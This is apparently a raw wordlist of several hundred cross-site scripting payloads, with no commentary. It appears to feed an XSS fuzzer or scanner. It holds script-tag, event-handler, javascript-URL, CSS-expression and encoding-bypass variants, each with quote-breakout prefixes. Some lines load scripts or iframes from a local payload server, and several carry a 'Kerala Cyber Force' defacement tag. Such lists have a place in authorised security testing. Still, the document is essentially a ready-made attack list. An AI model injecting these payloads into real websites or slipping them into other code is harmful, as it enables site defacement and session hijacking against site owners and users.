%27%3E%3C%73%63%72%69%70%74%3E%4B%43%46%3C%2F%73%63%72%69%70%74%3E
%22%3E%3C%73%63%72%69%70%74%3E%4B%43%46%3C%2F%73%63%72%69%70%74%3E
%25%32%37%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%34%42%25%34%33%25%34%36%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45
%25%32%32%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%34%42%25%34%33%25%34%36%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45
%25%32%35%25%33%32%25%33%32%25%32%35%25%33%33%25%34%35%25%32%35%25%33%33%25%34%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%34%25%32%35%25%33%33%25%34%35%25%32%35%25%33%34%25%34%32%25%32%35%25%33%34%25%33%33%25%32%35%25%33%34%25%33%36%25%32%35%25%33%33%25%34%33%25%32%35%25%33%32%25%34%36%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%34%25%32%35%25%33%33%25%34%35
<h1>X</h1>
"><h1>X</h1>
'><h1>X</h1>
<marquee>Kerala Cyber Force</marquee>
"><marquee>Kerala Cyber Force</marquee>
'><marquee>Kerala Cyber Force</marquee>
<br><br><b><u>X</u></b>
"><br><br><b><u>X</u></b>
'><br><br><b><u>X</u></b>
<script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>
"><script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>
'><script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>
<script>alert%281%29</script>
"><script>alert%281%29</script>
'><script>alert%281%29</script>
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>/
"><script>alert(1)</script>/
'><script>alert(1)</script>/
<script%20language=vbscript>msgbox%20X</script>
"><script%20language=vbscript>msgbox%20X</script>
'><script%20language=vbscript>msgbox%20X</script>
></title><script>alert(X)</script>'"><marquee><h1>Kerala Cyber Force</h1></marquee>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
"><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
'><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
"><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
'><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>
‘;!–<SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}
!–<SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}
<img src="blah"onmouseover="alert(1);">
"><img src="blah"onmouseover="alert(1);">
'><img src="blah"onmouseover="alert(1);">
<img src="blah>" onmouseover="alert(1);">
"><img src="blah>" onmouseover="alert(1);">
'><img src="blah>" onmouseover="alert(1);">
<IMG SRC="javascript:alert(1);"
"><IMG SRC="javascript:alert(1);"
'><IMG SRC="javascript:alert(1);">
"><IMG SRC="javascript:alert(1);"
"><IMG SRC="javascript:alert(1);"
'><IMG SRC="javascript:alert(1);">
'><IMG SRC="javascript:alert(1);"
"><IMG SRC="javascript:alert(1);"
'><IMG SRC="javascript:alert(1);">
<IMG SRC="javascript:alert(1);"
"><IMG SRC="javascript:alert(1);"
'><IMG SRC="javascript:alert(1);"
<IMG SRC=javascript:alert(1)>
"><IMG SRC=javascript:alert(1)>
'><IMG SRC=javascript:alert(1)>
<IMG SRC=JaVaScRiPt:alert(1)>
"><IMG SRC=JaVaScRiPt:alert(1)>
'><IMG SRC=JaVaScRiPt:alert(1)>
</TITLE><SCRIPT>alert(1);</SCRIPT>
"><SCRIPT>alert(1);</SCRIPT>
'><SCRIPT>alert(1);</SCRIPT>
"></TITLE><SCRIPT>alert(1);</SCRIPT>
"><SCRIPT>alert(1);</SCRIPT>
'><SCRIPT>alert(1);</SCRIPT>
'></TITLE><SCRIPT>alert(1);</SCRIPT>
"><SCRIPT>alert(1);</SCRIPT>
'><SCRIPT>alert(1);</SCRIPT>
<IMG SRC=javascript:alert(&quot;X&quot;)>
"><IMG SRC=javascript:alert(&quot;X&quot;)>
'><IMG SRC=javascript:alert(&quot;X&quot;)>
<IMG SRC=`javascript:alert("Kerala Cyber Force, 'X'")`>
"><IMG SRC=`javascript:alert("Kerala Cyber Force, 'X'")`>
'><IMG SRC=`javascript:alert("Kerala Cyber Force, 'X'")`>
<IMG """><SCRIPT>alert(1)</SCRIPT>">
"><IMG """><SCRIPT>alert(1)</SCRIPT>">
'><IMG """><SCRIPT>alert(1)</SCRIPT>">
<img/src="1"/onerror="alert(1)"
"><img/src="1"/onerror="alert(1)"
'><img/src="1"/onerror="alert(1)"
SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
<IMG SRC=javascript:alert(String.fromCharCode(75,67,70))>
"><IMG SRC=javascript:alert(String.fromCharCode(75,67,70))>
'><IMG SRC=javascript:alert(String.fromCharCode(75,67,70))>
<IMG SRC="jav	ascript:alert(1);">
"><IMG SRC="jav	ascript:alert(1);">
'><IMG SRC="jav	ascript:alert(1);">
<IMG SRC="jav&#x09;ascript:alert(1);">
"><IMG SRC="jav&#x09;ascript:alert(1);">
'><IMG SRC="jav&#x09;ascript:alert(1);">
<IMG SRC="jav&#x0A;ascript:alert(1);">
"><IMG SRC="jav&#x0A;ascript:alert(1);">
'><IMG SRC="jav&#x0A;ascript:alert(1);">
<IMG SRC="jav&#x0D;ascript:alert(1);">
"><IMG SRC="jav&#x0D;ascript:alert(1);">
'><IMG SRC="jav&#x0D;ascript:alert(1);">
<IMG SRC=" &#14;  javascript:alert(1);">
"><IMG SRC=" &#14;  javascript:alert(1);">
'><IMG SRC=" &#14;  javascript:alert(1);">
<script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
'><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
<body onload="alert(1);">
"><body onload="alert(1);">
'><body onload="alert(1);">
<body onload="alert(1)">
"><body onload="alert(1)">
'><body onload="alert(1)">
<img src="javascript:alert(1)">
"><img src="javascript:alert(1)">
'><img src="javascript:alert(1)">
<p style="background:url('javascript:alert(1)')">
"><p style="background:url('javascript:alert(1)')">
'><p style="background:url('javascript:alert(1)')">
' style=abc:expression(X) ' \" style=abc:expression(X) \"
" type=image src=null onerror=X " \' type=image src=null onerror=X \'
onload='X' \" onload=\"X\"/onload=\"X\"/onload='X'/
\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=X>
<<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script
"><<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script
'><<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script
<<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script
"><<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script
'><<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script
<img src="x:gif" onerror="window['al\u0065rt'](1)"></img>
"><img src="x:gif" onerror="window['al\u0065rt'](1)"></img>
'><img src="x:gif" onerror="window['al\u0065rt'](1)"></img>
<img src="x:gif" onerror="eval('al'%2b'lert(1)')">
"><img src="x:gif" onerror="eval('al'%2b'lert(1)')">
'><img src="x:gif" onerror="eval('al'%2b'lert(1)')">
<img src="x:alert" onerror="eval(src%2b'(1)')">
"><img src="x:alert" onerror="eval(src%2b'(1)')">
'><img src="x:alert" onerror="eval(src%2b'(1)')">
<img/src="mars.png"alt="mars">
"><img/src="mars.png"alt="mars">
'><img/src="mars.png"alt="mars">
<object data="javascript:alert(1)">
"><object data="javascript:alert(1)">
'><object data="javascript:alert(1)">
<isindex type=image src=1 onerror=alert(1)>
"><isindex type=image src=1 onerror=alert(1)>
'><isindex type=image src=1 onerror=alert(1)>
<isindex action=javascript:alert(1) type=image>
"><isindex action=javascript:alert(1) type=image>
'><isindex action=javascript:alert(1) type=image>
<img src=x:alert(alt) onerror=eval(src) alt=0>
"><img src=x:alert(alt) onerror=eval(src) alt=0>
'><img src=x:alert(alt) onerror=eval(src) alt=0>
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>
"><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>
'><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>
<img src=foo.png onerror=%61%6C%65%72%74%28%2F%4B%43%46%2F%29/>
"><img src=foo.png onerror=%61%6C%65%72%74%28%2F%4B%43%46%2F%29/>
'><img src=foo.png onerror=%61%6C%65%72%74%28%2F%4B%43%46%2F%29/>
";location='javascript:alert(1)';
";location=location.hash)//#0={};alert(1)
";eval(unescape(location))//#%0Aalert(1)
<b/alt="1"onmouseover=InputBox+1language=vbs>X</b>
"><b/alt="1"onmouseover=InputBox+1language=vbs>X</b>
'><b/alt="1"onmouseover=InputBox+1language=vbs>X</b>
<b "<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>">X</b>
</a onmousemove="alert(1)">
"></a onmousemove="alert(1)">
'></a onmousemove="alert(1)">
data:text/html,<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src="x:ö" title="onerror=alert(1)//">
"><img src="x:ö" title="onerror=alert(1)//">
'><img src="x:ö" title="onerror=alert(1)//">
<img src="x:? title=" onerror=alert(1)//">
"><img src="x:? title=" onerror=alert(1)//">
'><img src="x:? title=" onerror=alert(1)//">
¼script¾alert(¢X¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">
"><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">
'><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">
"><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">
'><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">
<DIV STYLE="background-image: url(javascript:alert(1))">
"><DIV STYLE="background-image: url(javascript:alert(1))">
'><DIV STYLE="background-image: url(javascript:alert(1))">
<div style="background-image: url(javascript:alert(1););">
"><div style="background-image: url(javascript:alert(1););">
'><div style="background-image: url(javascript:alert(1););">
<DIV STYLE="background-image: url(&#1;javascript:alert(1))">
"><DIV STYLE="background-image: url(&#1;javascript:alert(1))">
'><DIV STYLE="background-image: url(&#1;javascript:alert(1))">
<div style="behaviour: url(http://127.0.0.1:3555/xss_serve_payloads/X.html);">
"><div style="behaviour: url(http://127.0.0.1:3555/xss_serve_payloads/X.html);">
'><div style="behaviour: url(http://127.0.0.1:3555/xss_serve_payloads/X.html);">
<div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/X.html));">
"><div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/X.html));">
'><div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/X.html));">
<div style="behaviour: url('http://127.0.0.1:3555/xss_serve_payloads/X.html');">
"><div style="behaviour: url('http://127.0.0.1:3555/xss_serve_payloads/X.html');">
'><div style="behaviour: url('http://127.0.0.1:3555/xss_serve_payloads/X.html');">
<div style="binding: url("http://127.0.0.1:3555/xss_serve_payloads/X.html"));">
"><div style="binding: url("http://127.0.0.1:3555/xss_serve_payloads/X.html"));">
'><div style="binding: url("http://127.0.0.1:3555/xss_serve_payloads/X.html"));">
<SCRIPT <B>alert(1);</SCRIPT>
"><SCRIPT <B>alert(1);</SCRIPT>
'><SCRIPT <B>alert(1);</SCRIPT>
<<SCRIPT>alert(1);/
"><<SCRIPT>alert(1);/
'><<SCRIPT>alert(1);//<</SCRIPT>
"><<SCRIPT>alert(1);//<</SCRIPT>
'><<SCRIPT>alert(1);//<</SCRIPT>
<<script>alert(1);</script>
"><<script>alert(1);</script>
'><<script>alert(1);</script>
"><script>alert(1);</script>
'><script>alert(1);</script>
<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">
"><INPUT TYPE="IMAGE" SRC="javascript:alert(1);">
'><INPUT TYPE="IMAGE" SRC="javascript:alert(1);">
<IMG SRC="javascript:alert(1)"
"><IMG SRC="javascript:alert(1)"
'><IMG SRC="javascript:alert(1)"
<iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html <
"><iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html <
'><iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html <
<SCRIPT>a=/X/
"><SCRIPT>a=/X/
'><SCRIPT>a=/X/alert(a.source)</SCRIPT>
"><SCRIPT>a=/X/alert(a.source)</SCRIPT>
'><SCRIPT>a=/X/alert(a.source)</SCRIPT>
\";alert(1);//
<input onfocus=javascript:alert(1) autofocus>
"><input onfocus=javascript:alert(1) autofocus>
'><input onfocus=javascript:alert(1) autofocus>
<select onfocus=javascript:alert(1) autofocus>
"><select onfocus=javascript:alert(1) autofocus>
'><select onfocus=javascript:alert(1) autofocus>
<textarea onfocus=javascript:alert(1) autofocus>
"><textarea onfocus=javascript:alert(1) autofocus>
'><textarea onfocus=javascript:alert(1) autofocus>
<keygen onfocus=javascript:alert(1) autofocus>
"><keygen onfocus=javascript:alert(1) autofocus>
'><keygen onfocus=javascript:alert(1) autofocus>
<input autofocus onfocus=alert(1)>
"><input autofocus onfocus=alert(1)>
'><input autofocus onfocus=alert(1)>
<iframe/ /onload=alert(1)></iframe>
"><iframe/ /onload=alert(1)></iframe>
'><iframe/ /onload=alert(1)></iframe>
<iframe/ "onload=alert(1)></iframe>
"><iframe/ "onload=alert(1)></iframe>
'><iframe/ "onload=alert(1)></iframe>
<iframe///////onload=alert(1)></iframe>
"><iframe///////onload=alert(1)></iframe>
'><iframe///////onload=alert(1)></iframe>
<iframe "onload=alert(1)></iframe>
"><iframe "onload=alert(1)></iframe>
'><iframe "onload=alert(1)></iframe>
<iframe<?php echo chr(11)?> onload=alert(1)></iframe>
"><iframe<?php echo chr(11)?> onload=alert(1)></iframe>
'><iframe<?php echo chr(11)?> onload=alert(1)></iframe>
<iframe<?php echo chr(12)?> onload=alert(1)></iframe>
"><iframe<?php echo chr(12)?> onload=alert(1)></iframe>
'><iframe<?php echo chr(12)?> onload=alert(1)></iframe>
<ScRIPT x src=//0x.lv?</style></script><script>alert(String.fromCharCode(75,67,70))</script>
"></script><script>alert(String.fromCharCode(75,67,70))</script>
'></script><script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script><script src=http://127.0.0.1:3555/xss_serve_payloads/X.js>
<ScRIPT x src=//0x.lv?</style></script><script>alert(String.fromCharCode(75,67,70))</script>
"></script><script>alert(String.fromCharCode(75,67,70))</script>
'></script><script>alert(String.fromCharCode(75,67,70))</script>
"><script>alert(String.fromCharCode(75,67,70))</script>
'><script>alert(String.fromCharCode(75,67,70))</script><script src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp>
</script><script>alert(X
"></script><script>alert(X
'></script><script>alert(X
%7D%3C/style%3E43%27%22%3E%3C/title%3E%3Cscript%3Ea=eval;b=alert;a(b(/X/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EX%3C/h1%3E%3C/marquee%3E
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#75;&#67;&#70;&#34;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>
"><FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>
'><FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>
')alert(1);
");alert(1);
“;alert(“X”);”
“;alert(String.fromCharCode(75,67,70));”
‘;alert(“X”);’
‘;alert(String.fromCharCode(75,67,70));’
“;alert(“X”)
“;alert(String.fromCharCode(75,67,70))
‘;alert(“X”)
‘;alert(String.fromCharCode(75,67,70))
<script>var var = 1; alert(var)</script>
"><script>var var = 1; alert(var)</script>
'><script>var var = 1; alert(var)</script>
<script type=text/javascript>alert(1)</script>
"><script type=text/javascript>alert(1)</script>
'><script type=text/javascript>alert(1)</script>
“><script >alert(1)</script>
<iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" width="800" height="800">iframe</iframe>
"><iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" width="800" height="800">iframe</iframe>
'><iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" width="800" height="800">iframe</iframe>
<IMG SRC=`javascript:alert(“X says, ‘X’”)`>
"><IMG SRC=`javascript:alert(“X says, ‘X’”)`>
'><IMG SRC=`javascript:alert(“X says, ‘X’”)`>
<img src = ”http://127.0.0.1:3555/xss_serve_payloads/X.js”>
"><img src = ”http://127.0.0.1:3555/xss_serve_payloads/X.js”>
'><img src = ”http://127.0.0.1:3555/xss_serve_payloads/X.js”>
<img src = ”http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp”>
"><img src = ”http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp”>
'><img src = ”http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp”>
<A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html">X</A>
"><A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html">X</A>
'><A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html">X</A>
<A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./">X</A>
"><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./">X</A>
'><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./">X</A>
<A HREF="javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'">X</A>
"><A HREF="javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'">X</A>
'><A HREF="javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'">X</A>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#75;&#67;&#70;&#39;&#41;&#59;>
"><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#75;&#67;&#70;&#39;&#41;&#59;>
'><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#75;&#67;&#70;&#39;&#41;&#59;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
"><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
'><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
"><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
'><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
"><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
'><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
“><s”%2b”cript>alert(1)</script>
“><ScRiPt>alert(1)</script>
“><<script>alert(1);//<</script>
foo%00<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
"><scr<script>ipt>alert(1)</scr</script>ipt>
'><scr<script>ipt>alert(1)</scr</script>ipt>
';alert(String.fromCharCode(75,67,70))//\';alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//\";alert(String.fromCharCode(75,67,70))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(75,67,70))&lt;/SCRIPT&gt;
';alert(String.fromCharCode(75,67,70))//\';alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//\";alert(String.fromCharCode(75,67,70))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}
'';!--"&lt;X&gt;=&amp;{()}
&lt;IMG SRC="javascript:alert(1);"&gt;
&lt;IMG SRC=javascript:alert(1)&gt;
&lt;IMG SRC=JaVaScRiPt:alert(1)&gt;
&lt;IMG SRC=javascript:alert(&amp;quot;X&amp;quot;)&gt;
&lt;IMG SRC=`javascript:alert("Kerala Cyber Force says, 'X'")`&gt;
&lt;IMG """&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;"&gt;
&lt;IMG SRC=javascript:alert(String.fromCharCode(75,67,70))&gt;
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
&lt;IMG SRC="jav&#x09;ascript:alert(1);"&gt;
&lt;IMG SRC="jav&amp;#x09;ascript:alert(1);"&gt;
&lt;IMG SRC="jav&amp;#x0A;ascript:alert(1);"&gt;
&lt;IMG SRC="jav&amp;#x0D;ascript:alert(1);"&gt;
<IMG SRC=`javascript:alert(1)`>
"><IMG SRC=`javascript:alert(1)`>
'><IMG SRC=`javascript:alert(1)`>
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;"&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;'&#x0D;X&#x0D;S&#x0D;S&#x0D;'&#x0D;)&#x0D;"&#x0D;>&#x0D;
<IMG STYLE="X:expr/*X*/ession(alert(1))">
"><IMG STYLE="X:expr/*X*/ession(alert(1))">
'><IMG STYLE="X:expr/*X*/ession(alert(1))">
<IMG DYNSRC="javascript:alert(1)">
"><IMG DYNSRC="javascript:alert(1)">
'><IMG DYNSRC="javascript:alert(1)">
<img dynsrc="javascript:alert(1);">
"><img dynsrc="javascript:alert(1);">
'><img dynsrc="javascript:alert(1);">
<IMG LOWSRC="javascript:alert(1)">
"><IMG LOWSRC="javascript:alert(1)">
'><IMG LOWSRC="javascript:alert(1)">
<input type="image" dynsrc="javascript:alert(1);">
"><input type="image" dynsrc="javascript:alert(1);">
'><input type="image" dynsrc="javascript:alert(1);">
<STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>X
"><STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>X
'><STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>X
<DIV STYLE="width: expression(alert(1));">
"><DIV STYLE="width: expression(alert(1));">
'><DIV STYLE="width: expression(alert(1));">
<div style="width: expression(alert(1););">
"><div style="width: expression(alert(1););">
'><div style="width: expression(alert(1););">
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>
"><STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>
'><STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>
<X STYLE="X:expression(alert(1))">
"><X STYLE="X:expression(alert(1))">
'><X STYLE="X:expression(alert(1))">
exp/*<A STYLE='no\X:noX("*//*");X:&#101;x&#x2F;*X*//*/*/pression(alert(1))'>
<STYLE TYPE="text/javascript">alert(1);</STYLE>
"><STYLE TYPE="text/javascript">alert(1);</STYLE>
'><STYLE TYPE="text/javascript">alert(1);</STYLE>
<STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>
"><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>
'><STYLE>.X{background-image:url("javascript:alert(1)");}</STYLE>
<A CLASS=X></A>
"><A CLASS=X></A>
'><A CLASS=X></A>
<STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>
"><STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>
'><STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
"><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
'><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<? echo('<SCR)';echo('IPT>alert(1)</SCRIPT>'); ?>
"><? echo('<SCR)';echo('IPT>alert(1)</SCRIPT>'); ?>
'><? echo('<SCR)';echo('IPT>alert(1)</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;">
"><META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;">
'><META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
"><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
'><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
<XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>
"><XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>
'><XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>
<SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
